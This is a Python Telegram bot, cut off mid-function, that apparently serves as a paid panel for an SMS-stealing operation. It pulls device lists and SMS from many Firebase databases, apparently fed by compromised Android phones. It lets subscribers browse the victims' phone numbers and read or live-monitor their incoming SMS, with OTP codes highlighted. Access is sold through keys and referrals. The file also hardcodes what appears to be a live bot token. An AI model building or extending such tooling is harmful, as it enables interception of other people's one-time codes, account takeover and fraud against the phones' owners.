#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XRSAM Firebase SMS Bot
- Colored buttons (primary / success / danger) via raw reply_markup
- Original flow kept: captcha, access, generate, SMS monitor, admin
- Deep phone extraction + multi-path Firebase
"""

import os
import re
import json
import time
import random
import asyncio
import logging
import hashlib
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from pathlib import Path

try:
    import aiohttp
except ImportError:
    aiohttp = None

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    ContextTypes, filters,
)

# ═══════════════════ CONFIG ═══════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9184177986:AAHcjE-eINpZIemzPdpAT6jYLKXgjlIC4TE")
ADMIN_IDS = {7200716402}
for _x in os.environ.get("ADMIN_IDS", "").split(","):
    _x = _x.strip()
    if _x.isdigit():
        ADMIN_IDS.add(int(_x))

REFERRAL_MINUTES = 60
FREE_MINUTES = 15
SMS_IDLE_STOP_SEC = 180
SMS_POLL_SEC = 0.8
DEVICE_PAGE = 8

DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
DATA_DIR.mkdir(parents=True, exist_ok=True)
DB_FILE = DATA_DIR / "db.json"

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("xrsam_fb")


# ═══════════════════ COLORED BUTTONS (raw Telegram API) ═══════════════════
def ibtn(text: str, callback_data: str = None, url: str = None, style: str = None) -> dict:
    """One inline button as API dict. style: primary | success | danger"""
    b = {"text": text}
    if callback_data is not None:
        b["callback_data"] = str(callback_data)[:64]
    if url is not None:
        b["url"] = url
    if style in ("primary", "success", "danger"):
        b["style"] = style
    return b


def ikb(rows: List[List[dict]]) -> dict:
    """reply_markup dict for sendMessage"""
    return {"inline_keyboard": rows}


async def send_menu(bot, chat_id: int, text: str, rows: List[List[dict]], parse_mode: str = "HTML"):
    """Send message with colored inline keyboard (raw API — styles work)."""
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "reply_markup": json.dumps(ikb(rows)),
    }
    try:
        return await bot.send_message(
            chat_id=chat_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=ikb(rows),  # PTB accepts dict in many versions
        )
    except Exception as e1:
        log.warning("send_menu PTB: %s — trying request", e1)
        try:
            # force via bot.request / low level
            from telegram.request import HTTPXRequest
            url = f"https://api.telegram.org/bot{bot.token}/sendMessage"
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json={
                    "chat_id": chat_id,
                    "text": text,
                    "parse_mode": parse_mode,
                    "reply_markup": ikb(rows),
                }) as resp:
                    data = await resp.json()
                    if not data.get("ok"):
                        log.error("API sendMessage: %s", data)
                        # last resort: no style
                        plain_rows = []
                        for row in rows:
                            plain_rows.append([{k: v for k, v in b.items() if k != "style"} for b in row])
                        async with session.post(url, json={
                            "chat_id": chat_id,
                            "text": text,
                            "parse_mode": parse_mode,
                            "reply_markup": {"inline_keyboard": plain_rows},
                        }) as resp2:
                            return await resp2.json()
                    return data
        except Exception as e2:
            log.error("send_menu raw: %s", e2)
            return await bot.send_message(chat_id, re.sub(r"<[^>]+>", "", text))


async def edit_menu(query, text: str, rows: List[List[dict]], parse_mode: str = "HTML"):
    try:
        return await query.edit_message_text(
            text=text,
            parse_mode=parse_mode,
            reply_markup=ikb(rows),
        )
    except Exception as e1:
        if "not modified" in str(e1).lower():
            try:
                await query.answer()
            except Exception:
                pass
            return None
        log.warning("edit_menu: %s", e1)
        try:
            return await query.message.reply_text(
                text, parse_mode=parse_mode, reply_markup=ikb(rows)
            )
        except Exception:
            return await send_menu(query.get_bot(), query.message.chat_id, text, rows, parse_mode)


# ═══════════════════ KEYBOARDS ═══════════════════
def rows_main() -> List[List[dict]]:
    return [
        [ibtn("🚀 GENERATE NUMBER", "gen", style="success")],
        [ibtn("⚡ HIGH RUSH", "gen_rush", style="danger")],
        [
            ibtn("🔑 ENTER KEY", "enter_key", style="primary"),
            ibtn("💎 BUY KEY", "buy_key", style="success"),
        ],
        [
            ibtn("⏳ MY TIME", "my_time", style="primary"),
            ibtn("👥 REFERRAL LINK", "my_ref", style="primary"),
        ],
    ]


def rows_gen_choose() -> List[List[dict]]:
    """After GENERATE — pick online or offline."""
    return [
        [ibtn("🟢 ONLINE NUMBERS", "gen_online", style="success")],
        [ibtn("🔴 OFFLINE NUMBERS", "gen_offline", style="danger")],
        [ibtn("⚡ HIGH RUSH", "gen_rush", style="primary")],
        [ibtn("🔙 BACK", "home", style="danger")],
    ]


def rows_admin() -> List[List[dict]]:
    return [
        [
            ibtn("➕ Add Firebase", "ad_addfb", style="primary"),
            ibtn("📦 Bulk FB", "ad_bulkfb", style="success"),
        ],
        [
            ibtn("📊 Stats", "ad_stats", style="success"),
            ibtn("📋 List FB", "ad_listfb", style="primary"),
        ],
        [
            ibtn("🎫 Gen Keys", "ad_keys", style="success"),
            ibtn("📢 Channels", "ad_channels", style="primary"),
        ],
        [
            ibtn("🎁 Gift time", "ad_gift", style="success"),
            ibtn("⏱ Per-refer time", "ad_refmins", style="primary"),
        ],
        [
            ibtn("idle SMS sec", "ad_idlesec", style="primary"),
            ibtn("🖼 Welcome media", "ad_welcome", style="success"),
        ],
        [
            ibtn("👥 Users", "ad_users", style="primary"),
            ibtn("🗑 Remove FB", "ad_rmfb", style="danger"),
        ],
        [ibtn("🗑 Bulk Delete FB", "ad_bulkrmfb", style="danger")],
    ]


def rows_device(fb_idx: int, dev_id: str) -> List[List[dict]]:
    return [
        [ibtn("📩 LAST 5 SMS", f"sms5:{fb_idx}:{dev_id}", style="primary")],
        [ibtn("📡 SMS MONITOR", f"mon:{fb_idx}:{dev_id}", style="success")],
        [ibtn("🔙 BACK TO DEVICE LIST", "gen", style="danger")],
    ]


def rows_mon_stop(fb_idx: int, dev_id: str) -> List[List[dict]]:
    return [
        [ibtn("🛑 STOP SMS MONITOR", f"monstop:{fb_idx}:{dev_id}", style="danger")],
        [ibtn("🔙 BACK TO DEVICE", f"dev:{fb_idx}:{dev_id}", style="primary")],
    ]


# ═══════════════════ STORAGE ═══════════════════
def _now() -> float:
    return time.time()

def _load() -> dict:
    if not DB_FILE.exists():
        return {
            "users": {}, "firebases": [], "keys": {}, "channels": [],
            "welcome": {
                "text": (
                    "<b>🔥 XRSAM · FIREBASE SMS</b>\n\n"
                    "Generate live numbers & receive OTP instantly.\n"
                    "Use referral or keys for more time.\n\n"
                    "<i>Choose an option below</i>"
                ),
                "media_type": None, "media_file_id": None,
            },
            "settings": {"referral_minutes": REFERRAL_MINUTES, "sms_idle_sec": 180},
        }
    try:
        return json.loads(DB_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {"users": {}, "firebases": [], "keys": {}, "channels": [], "welcome": {}, "settings": {}}

def _save(db: dict) -> None:
    tmp = DB_FILE.with_suffix(".tmp")
    tmp.write_text(json.dumps(db, indent=2, ensure_ascii=False), encoding="utf-8")
    tmp.replace(DB_FILE)

def db_get() -> dict:
    return _load()

def db_update(mutator) -> dict:
    db = _load()
    mutator(db)
    _save(db)
    return db

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def user_rec(db: dict, uid: int) -> dict:
    s = str(uid)
    if s not in db["users"]:
        db["users"][s] = {
            "id": uid, "username": "", "joined": _now(), "verified": False,
            "access_until": 0.0, "referrals": 0, "referred_by": None,
            "captcha": None, "pending_ref": None, "channels_ok": False,
            "monitor": None, "got_free": False,
        }
    return db["users"][s]

def has_access(u: dict) -> bool:
    return float(u.get("access_until") or 0) > _now()

def access_left_str(u: dict) -> str:
    left = int(float(u.get("access_until") or 0) - _now())
    if left <= 0:
        return "0m"
    h, m = divmod(left // 60, 60)
    return f"{h}h {m}m" if h else f"{m}m"

def add_access_minutes(u: dict, minutes: float) -> None:
    base = max(_now(), float(u.get("access_until") or 0))
    u["access_until"] = base + minutes * 60


# ═══════════════════ FIREBASE ═══════════════════
async def fb_get(url: str, key: str, path: str) -> Any:
    if aiohttp is None:
        raise RuntimeError("pip install aiohttp")
    base = (url or "").strip().rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base
    for suf in ("/clients", "/messages", "/Devices", "/devices", "/.json", ".json"):
        if base.lower().endswith(suf.lower()):
            base = base[: -len(suf)]
    q = f"?auth={key}" if (key or "").strip() else ""
    full = f"{base}/{path.lstrip('/')}.json{q}"
    timeout = aiohttp.ClientTimeout(total=8, connect=3)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(full, headers={"Accept": "application/json"}) as resp:
            text = await resp.text()
            if resp.status != 200:
                raise RuntimeError(f"FB {resp.status}: {text[:140]}")
            if not text or text.strip() == "null":
                return None
            try:
                return await resp.json(content_type=None)
            except Exception:
                return json.loads(text)


# cache: url -> (timestamp, data)
_fb_cache: Dict[str, tuple] = {}
_FB_CACHE_TTL = 12  # seconds — fast re-open of number list

async def fb_get_clients(url: str, key: str) -> Any:
    cache_key = f"{url}|{key}"
    now = time.time()
    hit = _fb_cache.get(cache_key)
    if hit and now - hit[0] < _FB_CACHE_TTL:
        return hit[1]

    paths = ("clients", "Devices", "devices", "users", "phones", "data/clients", "data/devices")

    async def _one(path):
        try:
            raw = await fb_get(url, key, path)
            if isinstance(raw, dict) and raw:
                return raw
            if isinstance(raw, list) and raw:
                return {str(i): v for i, v in enumerate(raw) if isinstance(v, dict)}
        except Exception:
            return None
        return None

    # race paths in parallel — first non-empty wins
    tasks = [asyncio.create_task(_one(p)) for p in paths]
    last_err = None
    result = {}
    try:
        done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED, timeout=9)
        for t in done:
            try:
                r = t.result()
                if r:
                    result = r
                    break
            except Exception as e:
                last_err = e
        # if still empty, wait a bit more for others
        if not result and pending:
            done2, pending2 = await asyncio.wait(pending, timeout=4)
            for t in done2:
                try:
                    r = t.result()
                    if r:
                        result = r
                        break
                except Exception as e:
                    last_err = e
        for t in tasks:
            if not t.done():
                t.cancel()
    except Exception as e:
        last_err = e

    if result:
        _fb_cache[cache_key] = (now, result)
        return result
    if last_err:
        raise last_err
    return {}


def _digits_phone(val) -> str:
    if val is None:
        return ""
    if isinstance(val, dict):
        for kk in ("phoneNumber", "phone", "number", "mobile", "msisdn", "simNumber"):
            if val.get(kk):
                return _digits_phone(val.get(kk))
        return ""
    s = str(val).strip()
    digits = re.sub(r"\D", "", s)
    if len(digits) >= 10:
        return digits[-10:]
    if len(digits) >= 8:
        return digits
    return s if s and s not in ("—", "-", "null", "None") else ""


def _extract_phone(d: dict) -> str:
    keys = (
        "phoneNumber", "phone", "number", "mobile", "sim", "simNumber", "sim1", "sim2",
        "msisdn", "lineNumber", "phone_number", "Phone", "Number", "mobileno", "mobileNo",
    )
    for k in keys:
        p = _digits_phone(d.get(k))
        if p:
            return p
    for sk in ("sims", "Sim", "SIM", "simInfo"):
        sims = d.get(sk)
        if isinstance(sims, list):
            for it in sims:
                p = _extract_phone(it) if isinstance(it, dict) else _digits_phone(it)
                if p:
                    return p
        elif isinstance(sims, dict):
            for it in sims.values():
                p = _extract_phone(it) if isinstance(it, dict) else _digits_phone(it)
                if p:
                    return p
    for v in d.values():
        if isinstance(v, (str, int, float)):
            digits = re.sub(r"\D", "", str(v))
            if 10 <= len(digits) <= 15:
                return digits[-10:]
        elif isinstance(v, dict):
            p = _extract_phone(v)
            if p:
                return p
    return ""


def parse_clients(raw: Any) -> List[dict]:
    out = []
    if not isinstance(raw, dict):
        return out
    for cid, d in raw.items():
        if not isinstance(d, dict) or not d:
            continue
        bat = d.get("battery") or d.get("batteryPercent") or d.get("bat") or d.get("Battery") or "0"
        try:
            bat_n = int(re.sub(r"[^0-9]", "", str(bat)) or 0)
        except Exception:
            bat_n = 0
        phone = _extract_phone(d)
        status = d.get("status", d.get("online", d.get("isOnline", d.get("connected"))))
        online = True
        if status is not None:
            if isinstance(status, str):
                online = status.lower() in ("1", "true", "online", "yes", "active", "on", "connected")
            else:
                online = bool(status)
        else:
            ls = d.get("lastSeen") or d.get("last_seen") or d.get("lastOnline") or d.get("timestamp")
            if ls is not None:
                try:
                    ts = float(ls)
                    if ts < 1e12:
                        ts *= 1000
                    online = (time.time() * 1000 - ts) < 15 * 60 * 1000
                except Exception:
                    online = True
        # 0% battery always treat as offline
        if bat_n <= 0:
            online = False
        model = d.get("name") or d.get("model") or d.get("device") or d.get("deviceName") or str(cid)[:10]
        # msg activity hint if present on device node
        msg_count = 0
        for mk in ("msgCount", "messagesCount", "smsCount", "message_count", "totalSms"):
            if d.get(mk) is not None:
                try:
                    msg_count = int(re.sub(r"[^0-9]", "", str(d.get(mk))) or 0)
                except Exception:
                    msg_count = 0
                break
        out.append({
            "id": str(cid),
            "phone": phone or "—",
            "online": online,
            "battery": bat_n,
            "msg_count": msg_count,
            "android": str(d.get("android") or d.get("version") or d.get("os") or "—"),
            "network": str(d.get("network") or d.get("carrier") or d.get("operator") or "—"),
            "name": str(model),
        })
    out.sort(key=lambda x: (not x["online"], x["phone"] in ("", "—"), x["phone"]))
    return out


def parse_messages(raw: Any, limit: int = 8) -> List[dict]:
    msgs = []
    if not isinstance(raw, dict):
        return msgs
    items = list(raw.items())
    if len(items) > 300:
        items = items[-300:]
    for k, v in items:
        if not isinstance(v, dict):
            continue
        text = str(v.get("message") or v.get("body") or v.get("text") or v.get("msg") or "")
        if not text.strip():
            continue
        msgs.append({
            "sender": str(v.get("sender") or v.get("from") or v.get("address") or "Unknown"),
            "text": text,
            "time": str(v.get("dateTime") or v.get("date") or v.get("time") or ""),
            "key": k,
        })
    msgs.reverse()
    return msgs[:limit]


def quote_otps(text: str) -> str:
    t = re.sub(r"\b(\d{4,8})\b", r"<code>\1</code>", text)
    return f"<blockquote>{t}</blockquote>"


def make_captcha() -> Tuple[str, int]:
    a, b = random.randint(2, 15), random.randint(1, 12)
    op = random.choice(["+", "-", "*"])
    if op == "+":
        return f"{a} + {b} = ?", a + b
    if op == "-":
        if b > a:
            a, b = b, a
        return f"{a} - {b} = ?", a - b
    a, b = random.randint(2, 9), random.randint(2, 9)
    return f"{a} × {b} = ?", a * b


# ═══════════════════ COMMANDS ═══════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.username or ""
    args = context.args or []
    db = db_get()
    u = user_rec(db, uid)
    u["username"] = uname
    if args and args[0].startswith("ref_"):
        try:
            ref_id = int(args[0][4:])
            if ref_id != uid and not u.get("referred_by"):
                u["pending_ref"] = ref_id
        except Exception:
            pass
    _save(db)

    if not u.get("verified"):
        q, ans = make_captcha()
        u["captcha"] = ans
        _save(db)
        await update.message.reply_text(
            f"<b>CAPTCHA VERIFICATION</b>\nSolve: <code>{q}</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    await after_verified(update, context, db, u)


async def after_verified(update: Update, context: ContextTypes.DEFAULT_TYPE, db: dict, u: dict):
    chat_id = update.effective_chat.id
    if not has_access(u) and not u.get("got_free"):
        add_access_minutes(u, FREE_MINUTES)
        u["got_free"] = True
        if u.get("pending_ref") and not u.get("referred_by"):
            rid = int(u["pending_ref"])
            u["referred_by"] = rid
            ref_mins = float(db.get("settings", {}).get("referral_minutes") or REFERRAL_MINUTES)

            def mut(d):
                ru = user_rec(d, rid)
                ru["referrals"] = int(ru.get("referrals") or 0) + 1
                add_access_minutes(ru, ref_mins)

            db_update(mut)
            try:
                await context.bot.send_message(
                    rid, f"<b>🎉 NEW REFERRAL</b>\n+{ref_mins} minutes!",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
        _save(db)

    w = db.get("welcome") or {}
    text = w.get("text") or (
        "<b>🔥 XRSAM · FIREBASE SMS</b>\n\n"
        "Generate live numbers & receive OTP instantly."
    )
    if text.strip() in ("Welcome to the service.", "Welcome."):
        text = (
            "<b>🔥 XRSAM · FIREBASE SMS</b>\n\n"
            "Generate live numbers & receive OTP instantly.\n"
            "Refer friends or use a key for more time."
        )
    status = "ACTIVE" if has_access(u) else "EXPIRED"
    text += f"\n\n<b>ACCESS {status}</b>\nTime left: <b>{access_left_str(u)}</b>\nChoose an option:"
    await send_menu(context.bot, chat_id, text, rows_main())


async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(f"Access denied.\nYour ID: {uid}")
        return
    await send_menu(
        context.bot,
        update.effective_chat.id,
        f"<b>🛠 ADMIN PANEL</b>\nID: <code>{uid}</code>\nChoose an action:",
        rows_admin(),
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_menu(
        context.bot,
        update.effective_chat.id,
        "<b>HELP</b>\n/start — menu\n/admin — admin\n/myid — your id\nGenerate → pick number → SMS Monitor",
        rows_main(),
    )


async def cmd_myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(
        f"Your ID: <code>{uid}</code>\nAdmin: {'YES' if is_admin(uid) else 'NO'}",
        parse_mode=ParseMode.HTML,
    )


# ═══════════════════ CALLBACKS ═══════════════════
async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data or ""
    db = db_get()
    u = user_rec(db, uid)
    bot = context.bot
    chat_id = q.message.chat_id

    if data == "my_time":
        await edit_menu(q, f"<b>⏳ MY TIME</b>\nLeft: <b>{access_left_str(u)}</b>\nReferrals: <b>{u.get('referrals') or 0}</b>", rows_main())
        return
    if data == "my_ref":
        me = await bot.get_me()
        link = f"https://t.me/{me.username}?start=ref_{uid}"
        mins = db.get("settings", {}).get("referral_minutes", REFERRAL_MINUTES)
        await edit_menu(q, f"<b>👥 REFERRAL</b>\n<code>{link}</code>\n\n+{mins} min per referral", rows_main())
        return
    if data == "enter_key":
        context.user_data["await_key"] = True
        await edit_menu(q, "🔑 Send your <b>KEY</b> now:", rows_main())
        return
    if data == "buy_key":
        await edit_menu(q, "<b>💎 BUY KEY</b>\nContact admin to purchase.", rows_main())
        return

    if data == "gen":
        await edit_menu(q, "<b>🚀 GENERATE NUMBER</b>\nChoose list:", rows_gen_choose())
        return

    if data in ("gen_online", "gen_offline", "gen_rush") or data.startswith("genpage:"):
        if not has_access(u) and not is_admin(uid):
            await edit_menu(q, "<b>ACCESS EXPIRED</b>\nEnter key or refer a friend.", rows_main())
            return
        page = int(data.split(":")[-1]) if data.startswith("genpage:") else 0
        await edit_menu(q, "⏳ Loading numbers…", [[ibtn("…", "noop", style="primary")]])
        fbs = db.get("firebases") or []
        if not fbs:
            await edit_menu(q, "❌ No Firebase. Admin must add one.", rows_main())
            return
        all_devs = []
        errors = []

        async def _load_one(i, fb):
            try:
                raw = await fb_get_clients(fb["url"], fb.get("key") or "")
                devs = parse_clients(raw if isinstance(raw, dict) else {})
                for d in devs:
                    d["_fb"] = i
                return devs, None
            except Exception as e:
                return [], str(e)[:60]

        results = await asyncio.gather(*[_load_one(i, fb) for i, fb in enumerate(fbs)])
        for devs, err in results:
            all_devs.extend(devs)
            if err:
                errors.append(err)
        if not all_devs:
            err = errors[0] if errors else "empty"
            await edit_menu(q, f"❌ No devices\n<code>{err}</code>", rows_main())
            return
        online_total = sum(1 for d in all_devs if d["online"])
        # dedupe by phone (keep best: online > higher battery > higher msg_count)
        uniq = {}
        for d in all_devs:
            ph = d.get("phone") or ""
            key = ph if ph not in ("", "—") else f"id:{d.get('id')}"
            prev = uniq.get(key)
            if not prev:
                uniq[key] = d
                continue
            # prefer online, then more battery, then more msgs
            score = lambda x: (1 if x["online"] else 0, x.get("battery") or 0, x.get("msg_count") or 0)
            if score(d) > score(prev):
                uniq[key] = d
        all_devs = list(uniq.values())

        # filter mode
        mode = "all"
        if data in ("gen_online", "gen_offline", "gen_rush"):
            context.user_data["gen_mode"] = {
                "gen_online": "online", "gen_offline": "offline", "gen_rush": "rush"
            }.get(data, "all")
        mode = context.user_data.get("gen_mode") or "all"
        if data.startswith("genpage:"):
            mode = context.user_data.get("gen_mode") or "all"

        if mode == "online":
            all_devs = [d for d in all_devs if d["online"]]
            # low battery online last (e.g. 12%), high battery first
            all_devs.sort(key=lambda x: (
                0 if x["phone"] not in ("", "—") else 1,
                -(x.get("battery") or 0),
                x["phone"],
            ))
        elif mode == "offline":
            all_devs = [d for d in all_devs if not d["online"]]
            all_devs.sort(key=lambda x: (
                0 if x["phone"] not in ("", "—") else 1,
                x.get("battery") or 0,
                x["phone"],
            ))
        elif mode == "rush":
            # high activity first (msg_count), online preferred
            all_devs.sort(key=lambda x: (
                -(x.get("msg_count") or 0),
                0 if x["online"] else 1,
                -(x.get("battery") or 0),
            ))
            # only keep those with some activity signal or online with phone
            rushed = [d for d in all_devs if (d.get("msg_count") or 0) > 0]
            if rushed:
                all_devs = rushed
            else:
                all_devs = [d for d in all_devs if d["online"] and d["phone"] not in ("", "—")]
        else:
            all_devs.sort(key=lambda x: (
                0 if x["online"] else 1,
                0 if x["phone"] not in ("", "—") else 1,
                -(x.get("battery") or 0) if x["online"] else (x.get("battery") or 0),
            ))

        if not all_devs:
            await edit_menu(q, f"❌ No <b>{mode}</b> numbers right now.\nTry another list.", rows_gen_choose())
            return
        start = page * DEVICE_PAGE
        chunk = all_devs[start:start + DEVICE_PAGE]
        rows = []
        for d in chunk:
            flag = "🟢" if d["online"] else "🔴"
            ph = d["phone"] if d["phone"] not in ("", "—") else "no-phone"
            label = f"{flag} {ph} · {d['battery']}%"
            rows.append([ibtn(label[:64], f"dev:{d['_fb']}:{d['id']}", style="success" if d["online"] else "danger")])
        nav = []
        if page > 0:
            nav.append(ibtn("◀️ Prev", f"genpage:{page-1}", style="primary"))
        if start + DEVICE_PAGE < len(all_devs):
            nav.append(ibtn("Next ▶️", f"genpage:{page+1}", style="primary"))
        if nav:
            rows.append(nav)
        rows.append([ibtn("🔄 REFRESH", "gen_" + (mode if mode in ("online","offline","rush") else "online"), style="success"), ibtn("🏠 HOME", "home", style="danger")])
        text = (
            f"<b>📱 {mode.upper()} NUMBERS</b>\n"
            f"Showing: <b>{len(all_devs)}</b> · Online in FB: <b>{online_total}</b>\n"
            f"Page {page + 1} · no duplicates\n"
            f"🟢 online · 🔴 offline/0% · ⚡ rush = busy lines"
        )
        await edit_menu(q, text, rows)
        return

    if data == "home":
        await edit_menu(q, f"<b>🏠 HOME</b>\nTime left: <b>{access_left_str(u)}</b>\nChoose an option:", rows_main())
        return

    if data.startswith("dev:"):
        _, fb_s, dev_id = data.split(":", 2)
        fb_i = int(fb_s)
        fbs = db.get("firebases") or []
        fb = fbs[fb_i]
        phone = "—"
        try:
            raw = await fb_get_clients(fb["url"], fb.get("key") or "")
            for d in parse_clients(raw if isinstance(raw, dict) else {}):
                if d["id"] == dev_id:
                    phone = d["phone"]
                    break
        except Exception:
            pass
        await edit_menu(
            q,
            f"<b>📱 DEVICE</b>\nID: <code>{dev_id}</code>\nNumber: <code>{phone}</code>",
            rows_device(fb_i, dev_id),
        )
        return

    if data.startswith("sms5:"):
        _, fb_s, dev_id = data.split(":", 2)
        fb_i = int(fb_s)
        fb = (db.get("firebases") or [])[fb_i]
        try:
            raw = await fb_get(fb["url"], fb.get("key") or "", f"messages/{dev_id}")
            if not raw:
                for p in (f"Messages/{dev_id}", f"sms/{dev_id}", f"SMS/{dev_id}"):
                    try:
                        raw = await fb_get(fb["url"], fb.get("key") or "", p)
                        if raw:
                            break
                    except Exception:
                        continue
            msgs = parse_messages(raw, 5)
        except Exception as e:
            await edit_menu(q, f"❌ {e}", rows_device(fb_i, dev_id))
            return
        if not msgs:
            await edit_menu(q, "No SMS found.", rows_device(fb_i, dev_id))
            return
        lines = ["<b>📩 LAST SMS</b>", ""]
        for m in msgs:
            lines += [f"From: <code>{m['sender']}</code>", f"Time: {m['time']}", quote_otps(m["text"][:400]), "─────"]
        await edit_menu(q, "\n".join(lines), rows_device(fb_i, dev_id))
        return

    if data.startswith("mon:"):
        if not has_access(u) and not is_admin(uid):
            await edit_menu(q, "Access expired.", rows_main())
            return
        _, fb_s, dev_id = data.split(":", 2)
        await start_monitor(q, context, db, u, int(fb_s), dev_id)
        return

    if data.startswith("monstop:"):
        u["monitor"] = None
        _save(db)
        await edit_menu(q, "🛑 Monitor stopped.", rows_main())
        return

    if data.startswith("ad_") and is_admin(uid):
        await handle_admin_cb(q, context, db, data)
        return


async def start_monitor(q, context, db, u, fb_i: int, dev_id: str):
    fbs = db.get("firebases") or []
    fb = fbs[fb_i]
    # Seed last_keys with EXISTING messages so only NEW SMS after this moment are forwarded
    seed_keys = []
    try:
        raw_m = await fb_get(fb["url"], fb.get("key") or "", f"messages/{dev_id}")
        if not raw_m:
            for p in (f"Messages/{dev_id}", f"sms/{dev_id}", f"SMS/{dev_id}"):
                try:
                    raw_m = await fb_get(fb["url"], fb.get("key") or "", p)
                    if raw_m:
                        break
                except Exception:
                    continue
        for m in parse_messages(raw_m, 50):
            k = m.get("key") or hashlib.md5((m["sender"] + m["text"] + m["time"]).encode()).hexdigest()
            seed_keys.append(k)
    except Exception:
        pass
    u["monitor"] = {
        "fb": fb_i, "device_id": dev_id, "last_keys": seed_keys[-80:],
        "started": _now(), "last_hit": _now(), "chat_id": q.message.chat_id,
    }
    _save(db)
    phone = "—"
    try:
        raw = await fb_get_clients(fb["url"], fb.get("key") or "")
        for d in parse_clients(raw if isinstance(raw, dict) else {}):
            if d["id"] == dev_id:
                phone = d["phone"]
                break
    except Exception:
        pass
    idle = int(db.get("settings", {}).get("sms_idle_sec") or SMS_IDLE_STOP_SEC)
    await edit_menu(
        q,
        f"<b>📡 SMS MONITOR ON</b>\n"
        f"Number: <code>{phone}</code>\n"
        f"Device: <code>{dev_id}</code>\n"
        f"Only <b>NEW</b> SMS after this will be forwarded.\n"
        f"Auto-off after <b>{idle}s</b> (~3 min) idle · poll {SMS_POLL_SEC}s",
        rows_mon_stop(fb_i, dev_id),
    )
    context.application.create_task(monitor_loop(context.application, uid=q.from_user.id))


async def monitor_loop(app: Application, uid: int):
    while True:
        await asyncio.sleep(SMS_POLL_SEC)
        db = db_get()
        u = db.get("users", {}).get(str(uid))
        if not u or not u.get("monitor"):
            return
        mon = u["monitor"]
        idle_limit = int(db.get("settings", {}).get("sms_idle_sec") or SMS_IDLE_STOP_SEC)
        if _now() - float(mon.get("last_hit") or mon.get("started") or _now()) > idle_limit:
            u["monitor"] = None
            _save(db)
            try:
                await send_menu(app.bot, mon["chat_id"], f"<b>🛑 Auto-stopped</b> (idle {idle_limit}s)", rows_main())
            except Exception:
                pass
            return
        fbs = db.get("firebases") or []
        fb_i = int(mon["fb"])
        if fb_i >= len(fbs):
            u["monitor"] = None
            _save(db)
            return
        fb = fbs[fb_i]
        dev_id = mon["device_id"]
        try:
            raw = await fb_get(fb["url"], fb.get("key") or "", f"messages/{dev_id}")
            if not raw:
                for p in (f"Messages/{dev_id}", f"sms/{dev_id}"):
                    try:
                        raw = await fb_get(fb["url"], fb.get("key") or "", p)
                        if raw:
                            break
                    except Exception:
                        continue
            msgs = parse_messages(raw, 20)
        except Exception:
            continue
        seen = set(mon.get("last_keys") or [])
        new_keys = []
        for m in reversed(msgs):
            k = m.get("key") or hashlib.md5((m["sender"] + m["text"] + m["time"]).encode()).hexdigest()
            new_keys.append(k)
            if k in seen:
                continue
            mon["last_hit"] = _now()
            try:
                await app.bot.send_message(
                    mon["chat_id"],
                    f"<b>📨 NEW SMS</b>\nFrom: <code>{m['sender']}</code>\nTime: {m['time']}\n{quote_otps(m['text'][:500])}",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
        mon["last_keys"] = list(dict.fromkeys((mon.get("last_keys") or []) + new_keys))[-50:]
        u["monitor"] = mon
        _save(db)


# ═══════════════════ ADMIN ═══════════════════
async def handle_admin_cb(q, context, db, data: str):
    if data == "ad_addfb":
        context.user_data["admin_state"] = "addfb_url"
        await q.message.reply_text("Send Firebase URL:\n<code>https://xxx.firebaseio.com</code>", parse_mode=ParseMode.HTML)
    elif data == "ad_bulkfb":
        context.user_data["admin_state"] = "bulkfb"
        await q.message.reply_text(
            "<b>BULK FB</b>\nOne per line:\n<code>URL</code>\n<code>URL|KEY</code>\n<code>NAME|URL|KEY</code>",
            parse_mode=ParseMode.HTML,
        )
    elif data == "ad_listfb":
        fbs = db.get("firebases") or []
        if not fbs:
            await q.message.reply_text("No firebases.")
            return
        lines = ["<b>FIREBASES</b>"]
        for i, f in enumerate(fbs, 1):
            lines.append(f"{i}. <b>{f.get('name') or 'FB'}</b>\n<code>{f['url']}</code>")
        await q.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
    elif data == "ad_stats":
        await admin_stats(q, db)
    elif data == "ad_keys":
        context.user_data["admin_state"] = "gen_keys"
        await q.message.reply_text("Send: <code>count minutes</code>\nEx: <code>5 60</code>", parse_mode=ParseMode.HTML)
    elif data == "ad_channels":
        context.user_data["admin_state"] = "add_channel"
        await q.message.reply_text("Send <code>@username</code> or <code>-100id|link|Title</code>", parse_mode=ParseMode.HTML)
    elif data == "ad_gift":
        context.user_data["admin_state"] = "gift"
        await q.message.reply_text("Send: <code>user_id hours</code>", parse_mode=ParseMode.HTML)
    elif data == "ad_refmins":
        context.user_data["admin_state"] = "set_refmins"
        cur = db.get("settings", {}).get("referral_minutes", REFERRAL_MINUTES)
        await q.message.reply_text(f"Current: {cur} min\nSend new number:")
    elif data == "ad_idlesec":
        context.user_data["admin_state"] = "set_idlesec"
        cur = db.get("settings", {}).get("sms_idle_sec", SMS_IDLE_STOP_SEC)
